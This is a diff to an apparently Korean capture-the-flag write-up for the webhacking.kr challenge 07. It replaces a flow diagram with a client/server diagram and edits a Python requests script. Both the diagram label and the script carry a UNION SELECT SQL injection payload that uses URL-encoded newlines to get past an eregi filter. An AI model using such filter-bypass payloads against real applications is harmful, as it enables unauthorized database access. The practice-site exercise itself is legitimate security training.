@@ -2,19 +2,27 @@
 [webhacking.kr] 07
 ================================================================================================================
 
-.. uml::
-	
-	@startuml
+.. graphviz::
 
-	start
+    digraph G {
+        rankdir="LR";
+        node[shape="point"];
+        edge[arrowhead="none"]
 
-    :Source analysis;
+        {
+            rank="same";
+            "client"[shape="plaintext"];
+            "client" -> step0 -> step2 -> step4;
+        }
 
-    :eregi 함수 우회;
-    
-	stop
-
-	@enduml
+        {
+            rank="same";
+            "server"[shape="plaintext"];
+            "server" -> step1 -> step3 -> step5;
+        }
+        step0 -> step1[label="val='+'1)%0aunion%0aselect%0a3-1%23)",arrowhead="normal"];
+        step3 -> step2[label="@solve",arrowhead="normal"];
+    }
 
 |
 
@@ -119,7 +127,7 @@ eregi로 필터링되는 함수를 제외하여 rand가 1일 때 실행할 수 �
 
     import requests
 
-    url = "http://webhacking.kr/challenge/web/web-07/index.php?val="+"1)%0aunion%0aselect%0a3-1%23)"
+    url = "http://webhacking.kr/challenge/web/web-07/index.php?val='+'1)%0aunion%0aselect%0a3-1%23)"
     cookies = {
         "PHPSESSID":"9johqp6c81c5hf11lkomnghhn6"
     }
